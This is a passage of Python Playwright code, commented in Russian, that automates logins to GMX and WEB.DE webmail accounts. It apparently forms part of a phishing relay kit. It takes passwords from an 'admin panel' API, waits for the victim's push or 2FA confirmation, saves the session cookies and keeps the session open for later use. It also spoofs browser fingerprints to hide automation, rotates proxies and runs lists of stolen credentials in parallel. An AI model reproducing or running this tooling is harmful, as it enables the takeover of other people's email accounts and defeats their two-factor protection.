                        if on_push_wait_start:
                            try:
                                on_push_wait_start()
                            except Exception:
                                pass
                        if _wait_for_push_then_success(
                            page, context, email, lead_mode=True,
                            check_resend_requested=check_resend_requested,
                            on_resend_done=on_resend_done,
                        ):
                            _save_cookies_for_lead_mode(context, email)
                            log("Успех", "Результат: успешный вход (пуш подтверждён)")
                            _lead_hold_prepare()
                            return "success"
                        log("Успех", "Результат: требуется пуш (таймаут ожидания редиректа)")
                        return "push"
                    if _wait_for_push_then_success(page, context, email):
                        return True
                    return False
                if page.locator('input[type="password"]').count() == 0 and page.locator("form[action*='login']").count() == 0:
                    # Страница пуша часто без формы входа — даём время загрузиться и проверяем явно по тексту или по ссылке, иначе ошибочно закроем
                    time.sleep(3)
                    if _url_is_help_page_after_login(page.url):
                        return _on_help_page_success_then_pwchange(
                            page, context, email, lead_mode, on_lead_success_hold=_hold_cb
                        )
                    if _url_is_mailbox_or_pwchange(page.url) or _find_mailbox_page(context) is not None:
                        if lead_mode:
                            _save_cookies_for_lead_mode(context, email)
                            log("Успех", "Результат: успешный вход (форма входа исчезла, уже в почте)")
                            _lead_hold_prepare()
                            return "success"
                        _wait_then_save_cookies_and_exit(context, email)
                        return True
                    if _is_push_confirmation_page(page) or _is_push_confirmation_page(page, wait_link_sec=5):
                        time.sleep(1)
                        if _url_is_mailbox_or_pwchange(page.url) or _find_mailbox_page(context) is not None:
                            if lead_mode:
                                _save_cookies_for_lead_mode(context, email)
                                log("Успех", "Результат: успешный вход (почта, ветка без формы)")
                                _lead_hold_prepare()
                                return "success"
                            _wait_then_save_cookies_and_exit(context, email)
                            return True
                        if lead_mode:
                            if on_push_wait_start:
                                try:
                                    on_push_wait_start()
                                except Exception:
                                    pass
                            if _wait_for_push_then_success(
                                page, context, email, lead_mode=True,
                                check_resend_requested=check_resend_requested,
                                on_resend_done=on_resend_done,
                            ):
                                _save_cookies_for_lead_mode(context, email)
                                log("Успех", "Результат: успешный вход (пуш подтверждён)")
                                _lead_hold_prepare()
                                return "success"
                            log("Успех", "Результат: требуется пуш (таймаут ожидания редиректа)")
                            return "push"
                        if _wait_for_push_then_success(page, context, email):
                            return True
                        return False
                    if _page_is_two_factor_login(page) and not _page_has_push_indicators(page):
                        if lead_mode and poll_two_fa_code:
                            tf = _lead_mode_two_factor_challenge(
                                page,
                                context,
                                email,
                                poll_two_fa_code=poll_two_fa_code,
                                on_two_factor_wait_start=on_two_factor_wait_start,
                                on_wrong_two_fa=on_wrong_two_fa,
                                on_lead_success_hold=_hold_cb,
                            )
                            if tf != "two_factor":
                                return tf
                        if lead_mode:
                            log("2FA", "Результат: Zwei-Faktor-Authentifizierung")
                            return "two_factor"
                        return False
                    if _page_has_sms_or_code(page) and not _page_has_push_indicators(page):
                        if lead_mode:
                            log("SMS", "Результат: требуется ввод SMS-кода (пуш не используется)")
                            return "sms"
                        return False
                    if lead_mode:
                        _save_cookies_for_lead_mode(context, email)
                        log("Успех", "Результат: успешный вход (форма входа исчезла)")
                        _lead_hold_prepare()
                        return "success"
                    log("Успех", "Вход выполнен")
                    _wait_then_save_cookies_and_exit(context, email)
                    return True

                if (
                    lead_mode
                    and wait_for_new_password
                    and _still_on_login_surface(page, pw_selector_any)
                    and (_body_has_wrong_credentials_phrase(page) or _is_wrong_credentials(page))
                ):
                    if on_wrong_credentials:
                        try:
                            on_wrong_credentials()
                        except Exception:
                            pass
                    fresh_late = _api_password_newer_than_attempt()
                    if fresh_late:
                        wait_log(
                            "этап: позднее распознавание Zugangsdaten",
                            "в API уже другой пароль (до long-poll) — повтор Login",
                        )
                        password = fresh_late
                        log("Пароль", "Подставляю пароль из API и повторяю вход")
                        page.locator(pw_selector_any).first.fill(password)
                        time.sleep(step_delay)
                        continue
                    log("Пароль", "Неверные данные (позднее распознавание) — жду новый пароль от админки (long-poll, макс 3 мин)")
                    wait_log(
                        "этап: позднее распознавание Zugangsdaten",
                        "тот же long-poll POST /api/webde-wait-password до ~3 мин",
                    )
                    new_password = wait_for_new_password()
                    if not new_password:
                        fresh_after_late = _api_password_newer_than_attempt()
                        if fresh_after_late:
                            wait_log(
                                "long-poll (поздняя ветка)",
                                "таймаут long-poll, но в API уже новый пароль — использую",
                            )
                            new_password = fresh_after_late
                    if new_password and new_password != (password or ""):
                        wait_log("long-poll (поздняя ветка)", "пароль получен — повтор Login")
                        password = new_password
                        log("Пароль", "Ввожу новый пароль и повторяю вход")
                        page.locator(pw_selector_any).first.fill(password)
                        time.sleep(step_delay)
                        continue
                    if not new_password:
                        wait_log("long-poll (поздняя ветка)", "таймаут — password_timeout")
                        log("Успех", "Результат: password timeout (пароль от админки не передан)")
                        return "password_timeout"
                    wait_log("long-poll (поздняя ветка)", "пароль не изменился — wrong_credentials")
                    log("Успех", "Результат: неверные данные (таймаут или пароль не передан)")
                    return "wrong_credentials"

                alert("Не удалось подтвердить вход", "Страница после логина не распознана")
                return "error" if lead_mode else False

            alert("Исчерпаны попытки ввода пароля", "Проверьте логин и пароль")
            return "error" if lead_mode else False

        except PlaywrightTimeout as e:
            alert("Таймаут ожидания", str(e)[:100])
            return "error" if lead_mode else False
        finally:
            if os.getenv("DEBUG"):
                page.screenshot(path=Path(__file__).parent / "debug_screenshot.png")
            if KEEP_BROWSER_OPEN:
                log("Старт", "Браузер не закрыт. Закройте окно когда нужно, затем нажмите Enter в терминале.")
                input()
            elif (
                after_mail_success_fn
                and hold_session_after_lead_success
                and _LEAD_HELD_BROWSER_SESSION
                and _LEAD_HELD_BROWSER_SESSION.get("browser") is browser
            ):
                try:
                    after_mail_success_fn()
                except Exception as e:
                    log("KLEIN-ORCH", f"after_mail_success_fn: {type(e).__name__}: {e}")
                # Хук забирает сессию (take_lead_held_browser_session) и закрывает браузер по завершении оркестрации
            elif (
                _LEAD_HELD_BROWSER_SESSION
                and _LEAD_HELD_BROWSER_SESSION.get("browser") is browser
            ):
                log("Старт", "Браузер не закрыт — сессия для оркестрации (Klein / фильтры)")
            else:
                try:
                    browser.close()
                except Exception:
                    pass


def probe_gmx_proxy_fingerprint(
    email: str,
    proxy_config: dict | None,
    fingerprint_index: int,
    *,
    headless: bool = True,
    require_password_field: bool = False,
) -> str:
    """
    Проверка одной пары прокси + отпечаток: открытие auth.gmx.net, email → Weiter, ожидание пароля/капчи.
    voruebergehend | weiter_stall — «плохая» ячейка для сетки; ok — дошли до пароля или CaptchaFox.
    При require_password_field=True: ok только если видно поле пароля (капчу можно пройти вручную в headed).
    Возврат: ok | voruebergehend | weiter_stall | navigation_timeout | no_password_field | error
    """
    email = (email or "").strip()
    if not email:
        return "error"
    if not headless and os.name != "nt":
        disp = (os.environ.get("DISPLAY") or "").strip()
        wl = (os.environ.get("WAYLAND_DISPLAY") or "").strip()
        if not disp and not wl:
            headless = True
    FINGERPRINTS = _load_webde_fingerprints_playwright()
    if not FINGERPRINTS:
        return "error"
    fp = FINGERPRINTS[int(fingerprint_index) % len(FINGERPRINTS)]

    launch_args = [
        "--disable-blink-features=AutomationControlled",
        "--no-first-run",
        "--no-default-browser-check",
    ]
    if headless:
        launch_args.extend([
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-dev-shm-usage",
            "--disable-gpu",
        ])
    lo = {"headless": headless, "ignore_default_args": ["--enable-automation"], "args": launch_args}
    if USE_CHROME:
        lo["channel"] = "chrome"
    extra_headers: dict[str, str] = {"Accept-Language": fp["accept_language"]}
    hw = fp["hardware_concurrency"]
    mem = fp.get("device_memory")
    plat = fp["platform"].replace("\\", "\\\\").replace("'", "\\'")
    mtp = int(fp.get("max_touch_points") or 0)
    langs_js = json.dumps(fp.get("languages") or ["de-DE", "de", "en-US", "en"])
    mem_line = (
        f"Object.defineProperty(navigator, 'deviceMemory', {{ get: () => {int(mem)} }});"
        if mem is not None
        else ""
    )
    init_js = f"""
            Object.defineProperty(navigator, 'webdriver', {{ get: () => undefined }});
            Object.defineProperty(navigator, 'platform', {{ get: () => '{plat}' }});
            Object.defineProperty(navigator, 'hardwareConcurrency', {{ get: () => {hw} }});
            {mem_line}
            Object.defineProperty(navigator, 'maxTouchPoints', {{ get: () => {mtp} }});
            Object.defineProperty(navigator, 'languages', {{ get: () => {langs_js} }});
            if (!window.chrome) window.chrome = {{}};
            if (!window.chrome.runtime) window.chrome.runtime = {{}};
        """
    context_options: dict = {
        "locale": fp["locale"],
        "user_agent": fp["user_agent"],
        "viewport": fp["viewport"],
        "is_mobile": False,
        "has_touch": False,
        "device_scale_factor": 1.0,
        "timezone_id": fp["timezone_id"],
        "permissions": ["geolocation"],
        "extra_http_headers": extra_headers,
    }
    if proxy_config:
        context_options["proxy"] = proxy_config

    auth_url = get_auth_gmx_url_for_attempt(AUTH_GMX_URL, 0)
    email_selector = (
        'input[type="email"], input[name="username"], input[name="email"], '
        'input[placeholder*="E-Mail"], input#username'
    )
    pw_selector_any = (
        'input[type="password"], input[name="password"], input[name="credential"], input[id="password"], '
        'input[placeholder*="Passwort"], input[autocomplete="current-password"]'
    )
    weiter_btn_sel = 'button[type="submit"], input[type="submit"], [data-testid="next"], button:has-text("Weiter")'

    browser = None
    with sync_playwright() as p:
        try:
            browser = _launch_chromium_resilient(p, lo)
        except Exception:
            if USE_CHROME and lo.pop("channel", None) is not None:
                try:
                    browser = _launch_chromium_resilient(p, lo)
                except Exception:
                    return "error"
            else:
                return "error"
        try:
            context = browser.new_context(**context_options)
            context.add_init_script(init_js)
            page = context.new_page()
            page.set_default_navigation_timeout(90000)
            page.set_default_timeout(90000)
            if DIRECT_AUTH:
                page.goto(auth_url, wait_until="load", timeout=90000)
                time.sleep(2)
                if _is_login_temporarily_unavailable(page):
                    return "voruebergehend"
            else:
                page.goto(LOGIN_URL, wait_until="load", timeout=90000)
                time.sleep(2)
                if _is_login_temporarily_unavailable(page):
                    return "voruebergehend"
                close_consent_popup(page)
                time.sleep(2)
                page.goto(auth_url, wait_until="load", timeout=90000)
                time.sleep(2)
                if _is_login_temporarily_unavailable(page):
                    return "voruebergehend"

            _wait_and_fill(page, email_selector, email, timeout=25000)
            time.sleep(0.8)
            btn = page.locator('button[type="submit"], input[type="submit"], [data-testid="next"]').first
            if btn.count() > 0:
                btn.click()
            time.sleep(1)
            try:
                page.wait_for_load_state("load", timeout=15000)
            except Exception:
                pass

            # В автосценарии не ждём «минуту» появления поля пароля: либо оно появляется быстро,
            # либо это капча/блок/промежуточная страница и дальнейшая логика разберётся отдельно.
            max_wait_sec = 600 if (require_password_field and not headless) else 10
            for elapsed in range(0, max_wait_sec, 2):
                if _is_login_temporarily_unavailable(page):
                    return "voruebergehend"
                try:
                    if page.locator(pw_selector_any).first.count() > 0 and page.locator(pw_selector_any).first.is_visible():
                        return "ok"
                except Exception:
                    pass
                if not require_password_field:
                    if detect_captcha_type(page) == "captchafox":
                        return "ok"
                    try:
                        if page.get_by_text("Ich bin ein Mensch", exact=False).first.count() > 0:
                            return "ok"
                    except Exception:
                        pass
                if not require_password_field and elapsed >= 14:
                    try:
                        if (
                            page.locator(weiter_btn_sel).first.count() > 0
                            and page.locator(weiter_btn_sel).first.is_visible()
                            and page.locator(pw_selector_any).first.count() == 0
                            and detect_captcha_type(page) is None
                        ):
                            return "weiter_stall"
                    except Exception:
                        pass
                time.sleep(2)
            return "no_password_field" if require_password_field else "navigation_timeout"
        except PlaywrightTimeout:
            return "navigation_timeout"
        except Exception:
            return "error"
        finally:
            if browser is not None:
                try:
                    browser.close()
                except Exception:
                    pass


if __name__ == "__main__":
    accounts = load_all_credentials_from_file()
    proxies = load_all_proxies_from_file()
    if proxies:
        log("MAIN", f"Загружено прокси: {len(proxies)} (формат: host:port:login:password)")
    if len(accounts) <= 1:
        # Один аккаунт или пусто — при «Login vorübergehend nicht möglich» пробуем другой прокси/отпечаток
        proxy_list = proxies if proxies else [None]
        for attempt, proxy_config in enumerate(proxy_list):
            try:
                login_gmx(headless=HEADLESS, proxy_config=proxy_config)
                break
            except LoginTemporarilyUnavailable:
                log("MAIN", "Вход временно недоступен — закрыт, пробую другой IP/прокси")
                if attempt + 1 >= len(proxy_list):
                    log("MAIN", "Прокси закончились, выход")
                    raise
    else:
        log("MAIN", f"Загружено аккаунтов: {len(accounts)}, потоков: {min(PARALLEL_WORKERS, len(accounts))}")
        with ThreadPoolExecutor(max_workers=min(PARALLEL_WORKERS, len(accounts))) as ex:
            futures = {}
            for i, (e, p) in enumerate(accounts):
                proxy_config = proxies[i % len(proxies)] if proxies else None
                fut = ex.submit(login_webde, email=e, password=p, headless=HEADLESS, proxy_config=proxy_config)
                futures[fut] = (e, p)
            for fut in as_completed(futures):
                email, password = futures[fut]
                try:
                    ok = fut.result()
                    log("MAIN", f"[{email}] Вход {'успешен' if ok else 'не удался'}")
                except LoginTemporarilyUnavailable:
                    log("MAIN", f"[{email}] Вход временно недоступен — смена IP, запустите скрипт снова")
                except Exception as err:
                    log("MAIN", f"[{email}] Ошибка: {err}")
